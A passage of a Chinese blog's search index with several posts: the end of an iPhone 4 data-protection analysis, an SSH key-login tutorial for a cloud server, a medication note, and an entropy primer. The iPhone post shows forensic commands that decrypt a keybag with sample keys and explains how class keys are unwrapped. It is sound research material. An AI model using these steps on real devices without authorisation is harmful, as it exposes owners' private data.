iv 初始向量</li>\n<li>系统进程<code>MKBPayload</code>读取 <code>systembag.kb</code> 文件内容并进行解密，获得所有类密钥的密文<code>Class Key!</code></li>\n</ol>\n<p><img src=\"/2024/01/10/iPhone4-%E6%95%B0%E6%8D%AE%E7%A0%B4%E8%A7%A3%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/keybag.png\" alt=\"二进制文件参考\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">get_bag1</span></span><br><span class=\"line\">iv = e859f45ec0a3ab208ec61477b74e92f0</span><br><span class=\"line\">key = 71ebb0dd387647d7b1c4d10161f5f0b622937867ffe437e41a02ccaacfe8ffb2</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">./decrypt_systembag.py -k 71ebb0dd387647d7b1c4d10161f5f0b622937867ffe437e41a02ccaacfe8ffb2 -i e859f45ec0a3ab208ec61477b74e92f0 -o example/keybag example/systembag.kb</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">./parse_keybag.py example/keybag</span></span><br><span class=\"line\">HEADER</span><br><span class=\"line\">  VERS = 4      // 2- iOS 4.3 ，3 - iOS 5</span><br><span class=\"line\">  TYPE = 0      // 0 - System，1 - Backup，3 - Escrow</span><br><span class=\"line\">  UUID = cf7591b3dfc64ce8b4c36018fba96374</span><br><span class=\"line\">  HMCK = e0d8a575d2af7d15bcb26de7688d7c84eb9a4711a845b3c5d56b49c94bdc4216f165ecb4ea97ec18   // HMAC 校验值</span><br><span class=\"line\">  WRAP = 1      // 1 - UID 保护</span><br><span class=\"line\">  SALT = a358808b695d260c8a21ec801ce43db3efafecda       // 用于 Passcode KDF 的参数？</span><br><span class=\"line\">  ITER = 50000                                          // 用于 Passcode KDF 的参数？</span><br><span class=\"line\">  TKMT = 0</span><br><span class=\"line\">  SART = 98</span><br><span class=\"line\">  UUID = 9ab835423fe14b8c99b4be0ae6b066a3</span><br><span class=\"line\">KEYS</span><br><span class=\"line\">  0:</span><br><span class=\"line\">    CLAS = 1    // NSFileProtectionComplete 类</span><br><span class=\"line\">    WRAP = 3    // 3 - UID &amp; Passcode Key 保护</span><br><span class=\"line\">    KTYP = 0</span><br><span class=\"line\">    WPKY = 150dd562e3c6a441a879e154617d758af77553121c2b70114e32f6ad87a5819b375c724adee094ee // 该类密钥的密文</span><br><span class=\"line\">    UUID = 9d4e1c3567cc41058b3d2ee381aaa48b</span><br><span class=\"line\">  1:</span><br><span class=\"line\">    CLAS = 2    // NSFileProtectionCompleteUnlessOpen 类</span><br><span class=\"line\">    WRAP = 3</span><br><span class=\"line\">    KTYP = 1</span><br><span class=\"line\">    WPKY = 0df35185f13495d49596531f38d7114e77134a91c16915a14f2531241a78afc0ae4deeaefd2d5933 // 类密钥，就是静态私钥！</span><br><span class=\"line\">    PBKY = 0252ce8f8acc7068e4ca64cab9227035460ed5cef0661818b382e88609b1a908       // 额外存储了静态公钥！</span><br><span class=\"line\">  2:</span><br><span class=\"line\">    UUID = 6f537c62fd22484095c2836b227a38eb</span><br><span class=\"line\">    CLAS = 3    // NSFileProtectionCompleteUntilFirstUserAuthentication 类</span><br><span class=\"line\">    WRAP = 3</span><br><span class=\"line\">    KTYP = 0</span><br><span class=\"line\">    WPKY = 055c81e0fbc7eac3eee65e92a64c53178a95a48df6b0fa0d0ed24f3eb6b2cac9105772f6cb32c391</span><br><span class=\"line\">  3:</span><br><span class=\"line\">    UUID = 9136f182f33b46c29499cc253c94a564</span><br><span class=\"line\">    CLAS = 5    // NSFileProtectionRecovery 类，保留未启用！</span><br><span class=\"line\">    WRAP = 3</span><br><span class=\"line\">    KTYP = 0</span><br><span class=\"line\">    WPKY = c5867706ef5cc9d03b7f098a9f1f583e58397a984a17173e8d8e685fc9d2ecbc8bb3c9d76ed89c71</span><br><span class=\"line\">  4:</span><br><span class=\"line\">    UUID = 4703951420ef4ceca92d3d6e35aceb02</span><br><span class=\"line\">    CLAS = 6</span><br><span class=\"line\">    WRAP = 3</span><br><span class=\"line\">    KTYP = 0</span><br><span class=\"line\">    WPKY = acb3be303c103526aee718633a1bd946720dd128460bf54bcee99408f9ffe281a96cf352eaf5c710</span><br><span class=\"line\">  5:</span><br><span class=\"line\">    UUID = e42e8612890b48c8bee12f7c3f5510f2</span><br><span class=\"line\">    CLAS = 7</span><br><span class=\"line\">    WRAP = 3</span><br><span class=\"line\">    KTYP = 0</span><br><span class=\"line\">    WPKY = 52a6d7f05a62ccf906ce449f26325f518ad468e6d53a98bff309ac89eba088983148bada67e29a36</span><br><span class=\"line\">  6:</span><br><span class=\"line\">    UUID = 34addd5fffcb4b619d377301e49b16d5</span><br><span class=\"line\">    CLAS = 8</span><br><span class=\"line\">    WRAP = 1</span><br><span class=\"line\">    KTYP = 0</span><br><span class=\"line\">    WPKY = 9f2ddbeeb002c9897f1486244cfa5cb948cd13c23d7c480513b8be36f46a11d1</span><br><span class=\"line\">  7:</span><br><span class=\"line\">    UUID = c703f8b157b44418acbb3de1d5f35178</span><br><span class=\"line\">    CLAS = 9</span><br><span class=\"line\">    WRAP = 3</span><br><span class=\"line\">    KTYP = 0</span><br><span class=\"line\">    WPKY = a777da0779ee752fb9d7f0651ed83c7c16945af3723f30d8d82afc26eb076b99220ebffeebf1b53c</span><br><span class=\"line\">  8:</span><br><span class=\"line\">    UUID = a72aa7d9d1ea4ab6ab6a27c89961d4d4</span><br><span class=\"line\">    CLAS = 10</span><br><span class=\"line\">    WRAP = 3</span><br><span class=\"line\">    KTYP = 0</span><br><span class=\"line\">    WPKY = b7ac60ea56917249d094fd21c44728cd77621f566e7ea6538c3475a2b3d43c6061b0fbc320eb7376</span><br><span class=\"line\">  9:</span><br><span class=\"line\">    UUID = 568dfdd2f8ae4edd9ae7f22bba3c9ce2</span><br><span class=\"line\">    CLAS = 11</span><br><span class=\"line\">    WRAP = 1</span><br><span class=\"line\">    KTYP = 0</span><br><span class=\"line\">    WPKY = 44389e92846f2c7bf1294be2fcaf88153638a881197590df03e0303b1af6ac47</span><br></pre></td></tr></table></figure>\n\n<p>请注意：</p>\n<ul>\n<li>缺少 Class 4 的类密钥，因为 DKey 的存储路径已经转移到 Effaceable Storage</li>\n<li>前面 5 个数据项是 Class 类密钥，后面 6 个数据项是 KeyChain 钥匙串的密钥</li>\n</ul>\n<figure class=\"highlight py\"><table><tr><td class=\"code\"><pre><span class=\"line\">PROTECTION_CLASSES=&#123;</span><br><span class=\"line\">    <span class=\"comment\"># 文件保护类型的定义</span></span><br><span class=\"line\">    <span class=\"number\">1</span>:<span class=\"string\">&quot;NSFileProtectionComplete&quot;</span>,</span><br><span class=\"line\">    <span class=\"number\">2</span>:<span class=\"string\">&quot;NSFileProtectionCompleteUnlessOpen&quot;</span>,</span><br><span class=\"line\">    <span class=\"number\">3</span>:<span class=\"string\">&quot;NSFileProtectionCompleteUntilFirstUserAuthentication&quot;</span>,</span><br><span class=\"line\">    <span class=\"number\">4</span>:<span class=\"string\">&quot;NSFileProtectionNone&quot;</span>,       <span class=\"comment\"># 已废弃，DKey 的存储位置改为 Effaceable Storage</span></span><br><span class=\"line\">    <span class=\"number\">5</span>:<span class=\"string\">&quot;NSFileProtectionRecovery?&quot;</span>,  <span class=\"comment\"># 未使用</span></span><br><span class=\"line\">    <span class=\"comment\"># 钥匙串类型的定义</span></span><br><span class=\"line\">    <span class=\"number\">6</span>: <span class=\"string\">&quot;kSecAttrAccessibleWhenUnlocked&quot;</span>,</span><br><span class=\"line\">    <span class=\"number\">7</span>: <span class=\"string\">&quot;kSecAttrAccessibleAfterFirstUnlock&quot;</span>,</span><br><span class=\"line\">    <span class=\"number\">8</span>: <span class=\"string\">&quot;kSecAttrAccessibleAlways&quot;</span>,</span><br><span class=\"line\">    <span class=\"number\">9</span>: <span class=\"string\">&quot;kSecAttrAccessibleWhenUnlockedThisDeviceOnly&quot;</span>,</span><br><span class=\"line\">    <span class=\"number\">10</span>: <span class=\"string\">&quot;kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly&quot;</span>,</span><br><span class=\"line\">    <span class=\"number\">11</span>: <span class=\"string\">&quot;kSecAttrAccessibleAlwaysThisDeviceOnly&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-Class-Key-的解封\"><a href=\"#2-Class-Key-的解封\" class=\"headerlink\" title=\"2. Class Key 的解封\"></a>2. Class Key 的解封</h3><p><img src=\"/2024/01/10/iPhone4-%E6%95%B0%E6%8D%AE%E7%A0%B4%E8%A7%A3%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/unlock2.png\" alt=\"核心流程\"><br>对于这些 <code>Class Key!</code>, 有3种解密方式：</p>\n<ul>\n<li>WRAP &#x3D; 1 ：只有 Device Key 保护，通过 AES_Decrypt 算法解密</li>\n<li>WRAP &#x3D; 2 ：只有 Passcode Key 保护，通过 AES_Unwrap 算法解封</li>\n<li>WRAP &#x3D; 3 ：模式1 + 模式2，首先使用 Passcode Key 解封，再使用 Device Key 解密</li>\n</ul>\n<p>更加具体的算法描述，请参见下图。<br><img src=\"/2024/01/10/iPhone4-%E6%95%B0%E6%8D%AE%E7%A0%B4%E8%A7%A3%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/unlock.png\" alt=\"unlock\"></p>\n<ol>\n<li>用户（开机时）必须手工输入 passcode</li>\n<li>安全隔区提取 Salt 盐值和 Iter 迭代次数，再次计算 Passcode Key<br> <code>Passcode Key = PBKDF2(passcode, salt, iter, outputLength=32)</code></li>\n<li>安全隔区使用 Passcode Key，<strong>逐一</strong>解封各个类密钥<br> <code>Class key! = AES_UNWRAP(Passcode Key, Class Key!!)</code></li>\n<li>类密钥解封完成后，与<code>systembag.kb</code>文件头部的 <code>HMCK</code>进行校验<br> 如果失败，可能是 passcode 输入错误，或者是硬件被更换。</li>\n<li>安全隔区使用基于 UID 的 Key 0x835 对类密钥进行解密<br> <code>Class key = AES_DECRYPT(Key 0x835, Class Key!)</code></li>\n<li>现在类密钥已经出现在内存中，可以用于解封文件 metadata 中的<code>per-file key</code></li>\n</ol>\n<h2 id=\"四、简要分析\"><a href=\"#四、简要分析\" class=\"headerlink\" title=\"四、简要分析\"></a>四、简要分析</h2><h3 id=\"1-systembag-kb-文件头部包含的-Salt-字段，是否已经转移到安全隔区的第二代存储组件了呢？\"><a href=\"#1-systembag-kb-文件头部包含的-Salt-字段，是否已经转移到安全隔区的第二代存储组件了呢？\" class=\"headerlink\" title=\"1. systembag.kb 文件头部包含的 Salt 字段，是否已经转移到安全隔区的第二代存储组件了呢？\"></a>1. systembag.kb 文件头部包含的 Salt 字段，是否已经转移到安全隔区的第二代存储组件了呢？</h3><p>正确！<br>Apple 第二代安全储存组件增加了计数器加密箱，包括：</p>\n<ul>\n<li>1个 128 位盐：就是 Salt 字段</li>\n<li>1个 128 位密码验证器：存储了 HMAC 校验值</li>\n<li>1个 8 位计数器</li>\n<li>1个 8 位最大尝试值</li>\n</ul>\n<p>也就是说，最核心的加密材料从 REE 环境的 keybag 中转移到 TEE 环境的安全隔区中。<br>需要注意的是，笔者认为第二代安全储存组件的密码验证器不是密钥包中的 HMCK 字段，因为密码验证器要求不能对外泄露，不可能存储在外部的密钥包中，HMCK 字段应该仅用于密钥包自身的数据完整性检查。</p>\n<hr>\n<h2 id=\"附录一：侧信道攻击\"><a href=\"#附录一：侧信道攻击\" class=\"headerlink\" title=\"附录一：侧信道攻击\"></a>附录一：侧信道攻击</h2><p>在密码学中，侧信道攻击（side-channel attack，也称旁路攻击）是一种基于密码系统的<strong>物理实现</strong>中获取信息的攻击方式，区别于暴力破解法，或者基于算法理论性弱点的密码分析。<br>值得注意的是，如果破解密码学系统使用的信息是通过与其使用人的合法交流获取的，这通常归类于社会工程学攻击。</p>\n<p>根据借助的介质，旁路攻击分为多个大类，包括：</p>\n<ul>\n<li>缓存攻击（Cache attack）：通过获取对缓存的访问权而获取缓存内的一些敏感信息，例如攻击者获取云端主机物理主机的访问权而获取存储器的访问权；</li>\n<li>计时攻击（Timing attack）：基于测量各种计算（例如，将攻击者的给定密码与受害者的未知密码进行比较）所需的时间的攻击。</li>\n<li>功耗监控攻击（Power-monitoring attack）：同一设备不同的硬件电路单元的运作功耗也是不一样的，因此一个程序运行时的功耗会随着程序使用哪一种硬件电路单元而变动，据此推断出资料输出位于哪一个硬件单元，进而窃取资料；<br>  进一步细分为 SPA（simple power analysis，静态功耗分析）和 DPA（differential power analysis，动态功耗分析）</li>\n<li>电磁攻击（Electromagnetic attack ）：设备运算时会泄漏电磁辐射，经过得当分析的话可解析出这些泄漏的电磁辐射中包含的信息（比如文本、声音、图像等），这种攻击方式除了用于密码学攻击以外也被用于非密码学攻击等窃听行为，如TEMPEST攻击（例如范·埃克窃听、辐射监测）；</li>\n<li>声学密码分析（Acoustic cryptanalysis ）：通过捕捉设备在运算时泄漏的声学信号捉取信息（与功率分析类似）；</li>\n<li>差别错误分析（Differential fault analysis）：隐密资料在程序运行发生错误并输出错误信息时被发现；</li>\n<li>数据残留（Data remanence ）：可使理应被删除的敏感资料被读取出来（例如冷启动攻击）；</li>\n<li>软件初始化错误攻击（Software-initiated fault attacks）：现时较为少见，行锤（Row Hammer）攻击是该类攻击方式的一个实例，在这种攻击实现中，被禁止访问的存储器位置旁边的存储器空间如果被频繁访问将会有状态保留丢失的风险；</li>\n<li>光学方式（Optical）：即隐密资料被一些视觉光学仪器（如高清晰度相机、高清晰度摄影机等设备）捕捉。</li>\n</ul>\n<p>所有的攻击类型都利用了加密&#x2F;解密系统在进行加密&#x2F;解密操作时算法逻辑没有被发现缺陷，但是通过物理效应提供了有用的额外信息（这也是称为“旁路”的缘由），而这些物理信息往往包含了密钥、密码、密文等隐密资料。</p>\n<h2 id=\"附录二：有意思的一些企业信息\"><a href=\"#附录二：有意思的一些企业信息\" class=\"headerlink\" title=\"附录二：有意思的一些企业信息\"></a>附录二：有意思的一些企业信息</h2><ol>\n<li>Sogeti 是凯捷咨询集团（Capgemini）旗下从事本地化技术服务的子公司，1967年在法国创建。该集团还包括 CAP 、GEMINI 和安永咨询等公司，是欧洲最大的IT外包服务商。<br>  <a href=\"iPhone_Data_Protection_in_Depth.pdf\">iPhone数据保护的深度分析 - iPhone Data Protection in Depth</a></li>\n<li>NCC Group 成立于1999年6月，当时美国国家计算中心（the National Computing Centre）将其商业部门出售给其现有的管理团队，是一个专业的安全审计机构。<br>  <a href=\"2016-BSidesROC-iOSCrypto.pdf\">iOS加密技术高级分析 -  A (not-so-quick) Primer on iOS Encryption</a></li>\n<li>ElcomSoft Co. Ltd.公司于1990年在美国成立，是国际领先的数字取证工具开发公司。<br>  <a href=\"OWASP_BeNeLux_Day_2011_-_A._Belenko_-_Overcoming_iOS_Data_Protection.pdf\">iOS取证技术 - iOS Forensics: Overcoming iPhone Data Protection</a><br>  <a href=\"0721C6_Andrey.Belenko_Evolution.of.iOS.Data.Protection.pdf\">iOS 数据保护的演变</a></li>\n<li>高田科技是一个台湾的科技企业，文档都是中文的，不过是繁体字。<br>  <a href=\"https://www.kaotenforensic.com/ios/\">iOS取证技术的系列文档</a></li>\n<li><a href=\"https://www.ibas.com/fi\">ibas</a> 是一个芬兰的科技公司，主要业务是数据恢复和信息技术取证。<br>  <a href=\"https://www.youtube.com/watch?v=5Es3wRSe3kY\">iPhone裸闪存数据恢复的视频演讲 - iPhone raw NAND recovery and forensics</a></li>\n<li>这是一篇比较完整的技术论文，Peter Teufl 等作者来自于奥地利格拉茨技术大学。<br>  <a href=\"iOS_Encryption_Systems.pdf\">iOS加密系统 - iOS Encryption Systems</a></li>\n<li>盘古石，是北京奇安信科技有限公司旗下专注于电子数据取证技术研发的团队。<br>  <a href=\"https://qz.qianxin.com/news-3-1.html\">https://qz.qianxin.com/</a></li>\n</ol>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://github.com/antoniozekic/papers_and_slides\">iPhone 攻击技术文档大全</a></li>\n<li><a href=\"https://www.cnblogs.com/xumenger/p/4491425.html\">Linux文件系统简介</a></li>\n<li><a href=\"https://www.anquanke.com/post/id/237769\">通过侧信道分析加强对iPhone用户身份验证的暴力破解攻击</a></li>\n<li><a href=\"https://www.kaotenforensic.com/ios/ios-data-protection/\">iOS资料保护机制简介</a></li>\n<li><a href=\"https://www.osslab.com.tw/iphone-5c-nand/\">超越FBI NSA, iPhone 5c 以物理NAND備份法破解iOS密碼</a></li>\n<li><a href=\"https://www.theiphonewiki.com/wiki/File_System_Crypto\">Jonathan Zdziarski 对iOS文件系统的论述</a></li>\n<li><a href=\"https://www.leiphone.com/category/zhuanlan/4dO3QQ178rkZ3mo5.html\">FBI vs Apple：FBI是幸运的 - 盘古团队</a></li>\n<li><a href=\"https://paper.seebug.org/papers/Archive/drops2/%E3%80%8AiOS%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%AC%E5%85%AD%E7%AB%A0%EF%BC%9A%E6%97%A0%E6%B3%95%E9%94%80%E6%AF%81%E7%9A%84%E6%96%87%E4%BB%B6.html\">iOS 破解分析 - 乌云</a></li>\n<li><a href=\"https://www.pmbonneau.com/multiboot/\">iPhone4 越狱教程系列</a></li>\n<li><a href=\"http://securityhorror.blogspot.com/2013/09/the-hackers-guide-to-dismantling-iphone_5697.html\">拆解 iPhone 的黑客指南（第 3 部分）</a></li>\n<li><a href=\"https://promon.co/security-news/what-you-need-to-know-about-ios-jailbreaks/\">有关iOS越狱的信息</a></li>\n</ul>\n<h3 id=\"官方文档\"><a href=\"#官方文档\" class=\"headerlink\" title=\"官方文档\"></a>官方文档</h3><ul>\n<li><a href=\"https://rfc2cn.com/rfc3394.html\">ATS-Key-Wrap 算法的 RFC 3394 规范</a></li>\n</ul>\n<h3 id=\"源代码\"><a href=\"#源代码\" class=\"headerlink\" title=\"源代码\"></a>源代码</h3><ul>\n<li><a href=\"https://github.com/nabla-c0d3/iphone-dataprotection\">iphone-dataprotection 工具包 - Github</a></li>\n<li><a href=\"https://github.com/russtone/systembag.kb\">https://github.com/russtone/systembag.kb</a></li>\n</ul>\n"},{"title":"为ECS设置ssh密钥登录的方法","url":"/2019/05/04/%E4%B8%BAECS%E8%AE%BE%E7%BD%AEssh%E5%AF%86%E9%92%A5%E7%99%BB%E5%BD%95%E7%9A%84%E6%96%B9%E6%B3%95/","content":"<p>最近，租用的腾讯云服务器ECS中招了，来自伦敦IDC的黑客通过ssh访问暴力破解root密码，并种上了木马（估计是挖矿的），看来必须重视安全加固工作了。<br>ECS开放了80和443端口提供http和https服务，维护用的ssh端口22也是必须的。虽然可以为root设置更加复杂的密码，但也是给自己找麻烦，想来想去，最好还是取消ssh的密码登录方式，改为密钥登录方式，具体的操作步骤如下：</p>\n<h2 id=\"在腾讯云上，配置ECS采用ssh密钥登录方式\"><a href=\"#在腾讯云上，配置ECS采用ssh密钥登录方式\" class=\"headerlink\" title=\"在腾讯云上，配置ECS采用ssh密钥登录方式\"></a>在腾讯云上，配置ECS采用ssh密钥登录方式</h2><ol>\n<li><p>登录腾讯云，并转到ECS控制台。<strong>注意：为保障安全，ECS在关机状态才能修改登录方式！</strong></p>\n</li>\n<li><p>选择<code>SSH密钥</code>-<code>创建密钥</code>，在弹出式窗口中选择<code>创建新密钥对</code>，并按提示进行操作。</p>\n<blockquote>\n<p>弹窗中的<code>使用已有公钥</code>按钮，其功能是：导入用户自己手工产生的公钥文件</p>\n</blockquote>\n <img src=\"/2019/05/04/%E4%B8%BAECS%E8%AE%BE%E7%BD%AEssh%E5%AF%86%E9%92%A5%E7%99%BB%E5%BD%95%E7%9A%84%E6%96%B9%E6%B3%95/ecs-1.png\" class=\"\">\n</li>\n<li><p>根据提示信息下载私钥文件,注意自行妥善保存。默认文件后缀名为.dms，可以改为.txt。</p>\n</li>\n<li><p>将新生成的密钥对与需要的ECS进行绑定。<strong>绑定ECS成功后，ECS就不再支持密码登录了</strong></p>\n<blockquote>\n<p>屏幕显示的公钥内容ssa-rsa，其实就是ECS服务器上<code>$HOME/.ssh/authorized_keys</code>的内容</p>\n</blockquote>\n <img src=\"/2019/05/04/%E4%B8%BAECS%E8%AE%BE%E7%BD%AEssh%E5%AF%86%E9%92%A5%E7%99%BB%E5%BD%95%E7%9A%84%E6%96%B9%E6%B3%95/ecs-2.png\" class=\"\"></li>\n</ol>\n<h2 id=\"调用方法1：在MAC上，用Terminal的命令行登录（需要指定密钥文件）\"><a href=\"#调用方法1：在MAC上，用Terminal的命令行登录（需要指定密钥文件）\" class=\"headerlink\" title=\"调用方法1：在MAC上，用Terminal的命令行登录（需要指定密钥文件）\"></a>调用方法1：在MAC上，用Terminal的命令行登录（需要指定密钥文件）</h2><p>基本步骤是：</p>\n<ol>\n<li><p>Mac OS 用户请打开系统自带的终端（Terminal）并输入以下命令，<strong>赋予私钥文件仅本人可读权限（必须设置！）</strong>。</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">chmod</span> 400 <span class=\"variable\">$HOME</span>/Downloads/TENCENT_ECS.txt</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>在Terminal窗口中执行以下命令，进行远程登录。</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh -i <span class=\"variable\">$HOME</span>/Downloads/TENCENT_ECS.txt root@119.22.33.44</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"调用方法2：更简单的，Terminal无密码直接登录\"><a href=\"#调用方法2：更简单的，Terminal无密码直接登录\" class=\"headerlink\" title=\"调用方法2：更简单的，Terminal无密码直接登录\"></a>调用方法2：更简单的，Terminal无密码直接登录</h2><p>在ssh指定密钥文件的基础上，还可以将ssh进一步简化为不需要指定密钥文件的信任方式，具体步骤如下：</p>\n<ol>\n<li><p>在mac终端生成公钥文件<code>id_rsa.pub</code>和私钥文件<code>id_rsa</code>。</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>\n\n <img src=\"/2019/05/04/%E4%B8%BAECS%E8%AE%BE%E7%BD%AEssh%E5%AF%86%E9%92%A5%E7%99%BB%E5%BD%95%E7%9A%84%E6%96%B9%E6%B3%95/ecs-3.jpeg\" class=\"\">\n\n<blockquote>\n<p>图中红色标识的是是否对公钥和私钥进行对称加密，如果你输入了的话，那么在后续利用私钥登录的时候，需要输入该密码对私钥进行解密。如果安全性要求不高，可以不输入，直接点击enter跳过。</p>\n</blockquote>\n</li>\n<li><p>在ECS服务器上寻找文件<code>$HOME/.ssh/authorized_keys</code></p>\n</li>\n<li><p>编辑该文件，添加<code>id_rsa.pub</code>里面的公钥数据。</p>\n</li>\n<li><p>修改该文件的权限为644</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">chmod</span> 644 <span class=\"variable\">$HOME</span>/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>现在MAC终端上可免密登录你的Linux服务器了，登录命令:</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh root@119.22.33.44</span><br></pre></td></tr></table></figure>\n\n<p> 或者，你也可以在<code>Terminal</code>的菜单上直接选择<code>选择远程连接</code>，而不需要先打开本地的字符终端了</p>\n<blockquote>\n<ul>\n<li>实际上，这就是腾讯云配置<code>使用已有公钥</code>的原理：首先在Client生成一对私钥和公钥，然后并将公钥内容加入到Server的<code>authorized_keys</code>文件中，使得其成为可信任的Client，这也是Github上代码自动化加载用户自定义运行环境配置的通用方法。</li>\n<li>注意：方法1需要在ssh命令行中指定私钥文件，而方法2不要指定私钥文件的原因是，Terminal自动调用Client的默认存储文件<code>$HOME/.ssh/id_rsa</code>，但前提是密钥是在这个Client生成的，如果其他client想要调用就需要自己去配置Server的公钥文件了。</li>\n</ul>\n</blockquote>\n</li>\n</ol>\n<hr>\n<h2 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h2><ul>\n<li><a href=\"https://cloud.tencent.com/document/product/213/16691#1.-%E5%88%9B%E5%BB%BA%E5%AF%86%E9%92%A5\">腾讯云-如何添加云服务器的密钥对</a></li>\n<li><a href=\"https://cloud.tencent.com/document/product/213/5436#.E4.BD.BF.E7.94.A8-ssh-.E7.99.BB.E5.BD.95.EF.BC.88.E6.9C.AC.E5.9C.B0.E7.B3.BB.E7.BB.9F.E4.B8.BA-linux.2Fmac-os.EF.BC.89\">腾讯云-如何使用SSH密钥文件进行终端接入</a></li>\n<li><a href=\"https://www.runoob.com/w3cnote/set-ssh-login-key.html\">菜鸟学堂-设置SSH密钥的方法</a></li>\n</ul>\n"},{"title":"今天晚上忘了吃药","url":"/2018/12/23/%E4%BB%8A%E5%A4%A9%E6%99%9A%E4%B8%8A%E5%BF%98%E4%BA%86%E5%90%83%E8%8D%AF/","content":"<p>饭可以不吃，药不能停！！！<br>好多药啊！</p>\n<blockquote>\n<ul>\n<li>拜糖平</li>\n<li>二甲双瓜</li>\n<li>甲钴胺</li>\n<li>阿斯匹林</li>\n</ul>\n</blockquote>\n","categories":["生活"],"tags":["兰州","有病"]},{"title":"信息论基础 - 信息熵","url":"/2024/07/16/%E4%BF%A1%E6%81%AF%E8%AE%BA%E5%9F%BA%E7%A1%80-%E4%BF%A1%E6%81%AF%E7%86%B5/","content":"<p>熵（Entropy）最早是物理学的概念，用于表示一个热力学系统的无序程度。1948年，美国数学家克劳德·香农发表论文《通信的数学理论》（A Mathematical Theory of Communication），将统计物理中熵的概念引申到信道通信的过程中，从而奠定了信息论的基础。</p>\n<p>信息论回答了通信理论的两个基本问题：一是数据压缩的极限（答案：熵$H$）；二是通信传输速率的临界（答案：信道容量$C$）</p>\n<ul>\n<li>香农第一定理：无失真信源编码定理，或变长码信源编码定理<br>  将原始信源符号转化为新的码符号，使码符号尽量服从等概分布，从而每个码符号所携带的信息量达到最大，进而可以用尽量少的码符号传输信源信息。即信源的信息熵 $H_r(S)$ 是无失真信源压缩的极限值。</li>\n<li>香农第二定理：有噪信道编码定理<br>  当信道的信息传输率不超过信道容量（$R&lt;C$）时，采用合适的信道编码方法可以实现任意高的传输可靠性，但若信息传输率超过了信道容量（$R&gt;C$），就不可能实现可靠的传输。</li>\n<li>香农第三定理：保真度准则下的有失真信源编码定理，或有损信源编码定理<br>  只要码长足够长，总可以找到一种信源编码，使编码后的信息传输率 $R’$ 略大于率失真函数 $R(D)$，而码的平均失真度不大于给定的允许失真度，即$D’ \\leq D$</li>\n</ul>\n<blockquote>\n<p>样本空间是概率论的基础，包含了所有可能的实验结果或观察结果。<br>本文使用 $:&#x3D;$ 表示“<strong>定义</strong>”，区别与一般意义的“相等”，或“赋值”</p>\n</blockquote>\n<h2 id=\"一、信息熵的定义\"><a href=\"#一、信息熵的定义\" class=\"headerlink\" title=\"一、信息熵的定义\"></a>一、信息熵的定义</h2><h3 id=\"1-自信息（Self-information）\"><a href=\"#1-自信息（Self-information）\" class=\"headerlink\" title=\"1. 自信息（Self-information）\"></a>1. 自信息（Self-information）</h3><p>自信息是一个事件的信息量的度量，基本思想是概率越小，事件蕴含的信息量越大，定义为：<br>$$I(x) :&#x3D; -\\log P_X(x)$$</p>\n<p>举个例子，假定北京天气是晴天的概率是 80%，下雨的概率是 20%，那么：</p>\n<ul>\n<li>天气预报说“今天是晴天”，提供的信息量就是 $-\\log 0.8&#x3D;0.322$，说明这是一个大概率事件</li>\n<li>天气预报说“今天是雨天”，提供的信息量就是 $-\\log 0.2&#x3D;2.322$，说明这是一个小概率事件</li>\n</ul>\n<p>一个 100% 概率发生的事件，其信息量就是 $-\\log 1&#x3D;0$；“国足踢进了世界杯“这种非常小概率的事件，一定有很多曲折的内幕，其蕴含的信息量就非常大；最极端的，如果发生概率为 0，那么一旦发生就意味着我们发现一个从不知道的新世界，信息量就是无穷大了！</p>\n<p>满足如下性质：</p>\n<ul>\n<li>非负性：$I(x) \\geq 0 $</li>\n<li>单调（递减）性：如果 $P(a) &lt; P(b)$，则$I(a) &gt; I(b)$</li>\n<li>独立可加性：当事件 $a$ 和 $b$ 相互独立时，$I(a,b) &#x3D; I(a) + I(b)$</li>\n</ul>\n<h3 id=\"2-信息熵（Information-Entropy）\"><a href=\"#2-信息熵（Information-Entropy）\" class=\"headerlink\" title=\"2. 信息熵（Information Entropy）\"></a>2. 信息熵（Information Entropy）</h3><p>定义为一个样本空间上所有随机事件（随机变量是离散的）的自信息的期望，熵在物理意义上是平均意义下对随机事件不确定性&#x2F;信息量的度量，计算机意义上是平均意义上对随机变量的编码长度。<br>换句话说，事件的概率分布和每个事件的信息量构成了一个随机变量，这个随机变量的均值（即期望），就是这个分布产生的信息量的平均值，即为信息熵。</p>\n<p><img src=\"/2024/07/16/%E4%BF%A1%E6%81%AF%E8%AE%BA%E5%9F%BA%E7%A1%80-%E4%BF%A1%E6%81%AF%E7%86%B5/xxs0.png\" alt=\"XXS\"></p>\n<p>如果样本空间是离散变量，也称为香农熵（Shannon Entropy），定义为：<br>$$H(x) :&#x3D; E_X[I(X)] &#x3D; - \\sum_{x \\in X} p(x) \\log 